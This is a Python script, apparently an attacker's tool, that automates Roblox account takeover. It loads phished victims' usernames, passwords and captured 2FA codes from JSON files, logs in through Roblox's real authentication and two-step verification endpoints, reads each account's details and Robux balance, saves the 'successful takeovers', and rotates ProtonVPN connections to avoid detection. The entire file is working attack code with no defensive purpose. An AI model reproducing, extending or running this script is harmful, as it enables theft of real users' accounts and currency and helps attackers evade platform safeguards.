#!/usr/bin/env python3
"""
Roblox 2FA Bypass Automation Script
Automates the process of using captured 2FA codes with ProtonVPN rotation
"""

import requests
import time
import json
import os
from datetime import datetime
import subprocess

class RobloxAccountTakeover:
    def __init__(self):
        self.session = requests.Session()
        self.captured_data_dir = "captured_data"
        self.vpn_connected = False
        
    def check_vpn_status(self):
        """Check if ProtonVPN is connected"""
        try:
            result = subprocess.run(['protonvpn-cli', 'status'], 
                                  capture_output=True, 
                                  text=True)
            if "Connected" in result.stdout:
                print("[✓] ProtonVPN is connected")
                self.vpn_connected = True
                return True
            else:
                print("[!] ProtonVPN not connected!")
                return False
        except Exception as e:
            print(f"[!] Error checking VPN: {e}")
            return False
    
    def connect_vpn(self, server="fastest"):
        """Connect to ProtonVPN"""
        print(f"[+] Connecting to ProtonVPN ({server})...")
        try:
            if server == "fastest":
                subprocess.run(['protonvpn-cli', 'connect', '--fastest'], check=True)
            else:
                subprocess.run(['protonvpn-cli', 'connect', server], check=True)
            
            time.sleep(5)  # Wait for connection
            
            if self.check_vpn_status():
                # Get new IP
                ip = requests.get('https://api.ipify.org').text
                print(f"[✓] Connected! New IP: {ip}")
                return True
        except Exception as e:
            print(f"[!] VPN connection failed: {e}")
            return False
    
    def rotate_vpn(self):
        """Rotate VPN to new server"""
        print("[+] Rotating VPN connection...")
        subprocess.run(['protonvpn-cli', 'disconnect'], check=False)
        time.sleep(2)
        return self.connect_vpn()
    
    def load_victims(self):
        """Load captured victim data"""
        victims = []
        if not os.path.exists(self.captured_data_dir):
            print("[!] No captured data found!")
            return victims
        
        files = [f for f in os.listdir(self.captured_data_dir) 
                if f.startswith('victim_') and f.endswith('.json')]
        
        for file in files:
            filepath = os.path.join(self.captured_data_dir, file)
            with open(filepath, 'r') as f:
                victim = json.load(f)
                victims.append(victim)
        
        print(f"[✓] Loaded {len(victims)} victims")
        return victims
    
    def attempt_login(self, username, password, twofa_code=None):
        """Attempt to login to Roblox account"""
        print(f"\n[+] Attempting login for: {username}")
        
        # Roblox login endpoint
        login_url = "https://auth.roblox.com/v2/login"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/json',
            'Referer': 'https://www.roblox.com/'
        }
        
        payload = {
            "ctype": "Username",
            "cvalue": username,
            "password": password
        }
        
        try:
            # Initial login attempt
            response = self.session.post(login_url, 
                                        json=payload, 
                                        headers=headers)
            
            print(f"[>] Response status: {response.status_code}")
            
            # Check if 2FA required
            if response.status_code == 403:
                response_data = response.json()
                
                if 'errors' in response_data:
                    for error in response_data['errors']:
                        if error['code'] == 2:  # 2FA required
                            print("[!] 2FA required")
                            
                            if twofa_code:
                                # Submit 2FA code
                                return self.submit_2fa(username, twofa_code, response)
                            else:
                                print("[!] No 2FA code available")
                                return False
            
            elif response.status_code == 200:
                print("[✓] Login successful!")
                return True
            
            else:
                print(f"[!] Login failed: {response.text}")
                return False
                
        except Exception as e:
            print(f"[!] Error during login: {e}")
            return False
    
    def submit_2fa(self, username, code, prev_response):
        """Submit 2FA code to Roblox"""
        print(f"[+] Submitting 2FA code: {code}")
        
        # Get challenge ID from previous response
        challenge_id = prev_response.headers.get('Rblx-Challenge-Id')
        
        if not challenge_id:
            print("[!] No challenge ID found")
            return False
        
        twofa_url = f"https://twostepverification.roblox.com/v1/users/{username}/challenges/authenticator/verify"
        
        payload = {
            "challengeId": challenge_id,
            "actionType": "Login",
            "code": code
        }
        
        try:
            response = self.session.post(twofa_url, json=payload)
            
            if response.status_code == 200:
                print("[✓] 2FA bypass successful!")
                return True
            else:
                print(f"[!] 2FA failed: {response.text}")
                return False
                
        except Exception as e:
            print(f"[!] Error submitting 2FA: {e}")
            return False
    
    def get_account_info(self):
        """Get account information after successful login"""
        try:
            # Get user info
            user_url = "https://users.roblox.com/v1/users/authenticated"
            response = self.session.get(user_url)
            
            if response.status_code == 200:
                user_data = response.json()
                print(f"[✓] Account info:")
                print(f"    User ID: {user_data.get('id')}")
                print(f"    Username: {user_data.get('name')}")
                print(f"    Display Name: {user_data.get('displayName')}")
                
                # Get Robux balance
                robux_url = f"https://economy.roblox.com/v1/users/{user_data.get('id')}/currency"
                robux_response = self.session.get(robux_url)
                
                if robux_response.status_code == 200:
                    robux_data = robux_response.json()
                    print(f"    Robux: {robux_data.get('robux', 0)}")
                
                return user_data
            
        except Exception as e:
            print(f"[!] Error getting account info: {e}")
            return None
    
    def process_victims(self, use_vpn=True):
        """Process all captured victims"""
        print("\n" + "="*60)
        print("ROBLOX ACCOUNT TAKEOVER AUTOMATION")
        print("="*60 + "\n")
        
        if use_vpn:
            if not self.check_vpn_status():
                if not self.connect_vpn():
                    print("[!] Failed to connect VPN. Continue anyway? (y/n)")
                    if input().lower() != 'y':
                        return
        
        victims = self.load_victims()
        
        if not victims:
            print("[!] No victims to process")
            return
        
        successful = 0
        failed = 0
        
        for i, victim in enumerate(victims, 1):
            print(f"\n[{i}/{len(victims)}] Processing victim...")
            print(f"Username: {victim['username']}")
            print(f"Email: {victim['email']}")
            print(f"2FA Captured: {victim.get('twoFACaptured', False)}")
            
            if not victim.get('twoFACaptured'):
                print("[!] No 2FA code captured, skipping...")
                failed += 1
                continue
            
            # Attempt login
            success = self.attempt_login(
                victim['username'],
                victim['password'],
                victim.get('twoFACode')
            )
            
            if success:
                successful += 1
                
                # Get account info
                account_info = self.get_account_info()
                
                # Save successful takeover
                takeover_file = f"successful_takeovers/{victim['username']}.json"
                os.makedirs("successful_takeovers", exist_ok=True)
                
                with open(takeover_file, 'w') as f:
                    json.dump({
                        'victim': victim,
                        'account_info': account_info,
                        'takeover_timestamp': datetime.now().isoformat()
                    }, f, indent=2)
                
                print(f"[✓] Takeover data saved to: {takeover_file}")
                
            else:
                failed += 1
            
            # Rotate VPN every 3 accounts
            if use_vpn and (i % 3 == 0) and i < len(victims):
                self.rotate_vpn()
            
            # Delay between attempts
            time.sleep(2)
        
        print("\n" + "="*60)
        print("SUMMARY")
        print("="*60)
        print(f"Total victims: {len(victims)}")
        print(f"Successful: {successful}")
        print(f"Failed: {failed}")
        print(f"Success rate: {(successful/len(victims)*100):.1f}%")
        print("="*60 + "\n")

def main():
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║   ROBLOX 2FA BYPASS AUTOMATION WITH PROTONVPN          ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    ato = RobloxAccountTakeover()
    
    print("\n[?] Use ProtonVPN for stealth? (recommended) (y/n)")
    use_vpn = input().lower() == 'y'
    
    ato.process_victims(use_vpn=use_vpn)

if __name__ == "__main__":
    main()
